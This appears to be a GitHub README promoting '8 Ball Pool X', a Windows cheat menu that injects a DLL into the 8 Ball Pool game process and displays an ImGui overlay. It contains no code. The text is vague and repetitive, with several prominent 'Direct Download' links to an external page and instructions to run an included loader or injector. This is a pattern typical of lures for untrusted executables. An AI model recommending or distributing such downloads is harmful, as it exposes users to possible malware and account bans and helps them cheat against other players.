# 8 Ball Pool X v2026 - Game Script Utility 2026

> Windows utility for 8 Ball Pool that loads through DLL injection and presents an ImGui overlay with menu-based in-game controls.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/mattkingca136/8-ball-pool-x-v2026-script?style=flat-square)](https://github.com/mattkingca136/8-ball-pool-x-v2026-script)

---

<p align="center">
  <a href="https://mattkingca136.github.io/8-ball-pool-x-v2026-script/">
    <img src="https://img.shields.io/badge/Download-8%20Ball%20Pool%20X%20Script-brightgreen?style=for-the-badge" alt="Download 8 Ball Pool X Script">
  </a>
</p>

> **[Direct Download - 8 Ball Pool X](https://mattkingca136.github.io/8-ball-pool-x-v2026-script/)**

---

[Download Latest Build](https://mattkingca136.github.io/8-ball-pool-x-v2026-script/)

---

## What It Is

8 Ball Pool X is a Windows-oriented game script utility for 8 Ball Pool that relies on process injection and an in-game overlay for control. The DLL is attached through an injector, after which an ImGui panel becomes available so you can adjust options without leaving the game.

The project is built around a mod-menu style workflow instead of a separate launcher. Its main emphasis is on keeping the loader path simple, preserving a workable overlay, and exposing toggle-based controls that can be switched during play.

---

## Script Features

- DLL injection flow for loading into the target process
- ImGui overlay for in-game interaction
- Mod menu interface for quick feature access
- Windows platform support
- Menu toggles for enabling and disabling controls
- Loader-based startup path
- Utility-style structure for game-side adjustments
- Designed specifically for 8 Ball Pool

---

## Setup

1. Download the latest build from the link above.
2. Extract the files to a folder you can access easily.
3. Use the included loader or injector to attach the DLL to the 8 Ball Pool process.
4. Launch the game, then open the overlay and use the menu controls.

Example workflow:

- Start 8 Ball Pool
- Run the injector or loader
- Wait for the ImGui overlay to appear
- Adjust the available menu options as needed

---

## Options

| Setting | Description |
| --- | --- |
| Overlay | Opens the ImGui panel in-game |
| Menu toggles | Turns individual features on or off |
| Loader path | Selects the DLL injection route |
| Target process | Points to the running 8 Ball Pool window |
| Window focus | Keeps control tied to the game session |

Basic control flow may look like this:

| Control | Action |
| --- | --- |
| Insert / Hotkey | Toggle overlay visibility |
| Menu click | Enable or disable a feature |
| Loader action | Inject the DLL into the target process |

---

## Compatibility

- Platform: Windows
- Target game: 8 Ball Pool
- Delivery method: DLL injection
- Interface: ImGui overlay and mod menu

Known limitations:
- Requires the target process to be running before injection
- Depends on the current game client and process state
- Overlay behavior may vary with window mode and system setup

---

## FAQ

### How do I get started?
Grab the build, unpack it, then use the loader or injector on the active 8 Ball Pool process.

### How do I access the settings?
Bring up the ImGui overlay and work with the toggle controls built into the script.

### Is there support for platforms other than Windows?
The current release is described as Windows-only.

### Can the menu be changed?
Yes. The interface is organized around menu-driven controls and on/off settings.

### Where should the files be kept?
Store the DLL, loader, and related files somewhere easy to reach, then aim the injector at the target process when you need it.

### What happens when a new build is released?
Swap out the older files for the newest download and repeat the normal loading steps.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
